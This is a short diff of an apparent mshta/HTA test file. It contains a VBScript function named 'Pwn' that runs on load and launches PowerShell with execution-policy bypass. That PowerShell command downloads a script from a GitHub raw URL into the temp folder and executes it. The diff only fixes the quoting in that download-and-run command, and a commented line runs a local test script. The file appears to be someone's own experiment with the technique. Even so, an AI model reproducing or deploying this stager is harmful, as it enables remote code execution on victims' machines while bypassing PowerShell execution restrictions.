@@ -11,7 +11,7 @@
   <script language="VBScript">
     Function Pwn()
       'CreateObject("wscript.shell").Run("powershell.exe -noexit -ep bypass -file C:\Users\turco\Documents\mshta-test\test.ps1")
-	  CreateObject("wscript.shell").Run('powershell.exe -noexit -ep bypass -Command {$tmp = $env:TEMP;$out = "out.ps1";$file = $tmp + "\" + $out;Invoke-WebRequest https://raw.githubusercontent.com/0xTurco/Test/main/test.ps1 -OutFile $file;& $file} '})
+	  CreateObject("wscript.shell").Run('powershell.exe -noexit -ep bypass -Command {$tmp = $env:TEMP;$out = "out.ps1";$file = $tmp + "\" + $out;Invoke-WebRequest https://raw.githubusercontent.com/0xTurco/Test/main/test.ps1 -OutFile $file;& $file}')
     End Function
 
     Pwn
